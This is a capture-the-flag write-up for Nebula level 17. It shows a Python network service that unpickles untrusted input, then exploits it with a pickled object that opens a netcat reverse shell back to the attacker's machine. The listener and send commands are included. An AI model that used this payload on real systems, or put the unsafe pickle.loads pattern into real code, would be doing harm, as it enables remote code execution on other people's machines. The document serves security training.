# Nebula - Lvel 17

### About ###

>There is a python script listening on port 10007 that contains a vulnerability.
>
>To do this level, log in as the level17 account with the password level17 . Files for this level can be found in /home/flag17.

### Source code ###

```python
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
    clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
    clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
    server(clnt)
    exit(1)
```

### Solution ###

This challenge is based on the misuse of the Python library `pickle` which can be used to execute malicious code.

To solve it, a reverse shell script is pickled with the `pickle` library and sent to the listening server from another machine (in this example the machine `kali` with the ip address 172.16.204.134, `nebula` has the ip address 172.16.204.135).

```python
import cPickle
import subprocess

class RemoteShell(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/nc.traditional', '-e', '/bin/bash', '172.16.204.134', '10008',),))

print cPickle.dumps(RemoteShell())
```

Then, on another shell on `kali`, a listening server for the remote shell is started.

```
root@kali:~# nc -l -p 10008
```

The pickled object is sent to the machine `nebula`.

```
root@kali:~/Nebula# python flag17.py | nc 172.16.204.135 10007
Accepted connection from 172.16.204.134:59304
```

`getflag` can now be executed successfully.

```
root@kali:~# nc -l -p 10008
getflag
You have successfully executed getflag on a target account
```
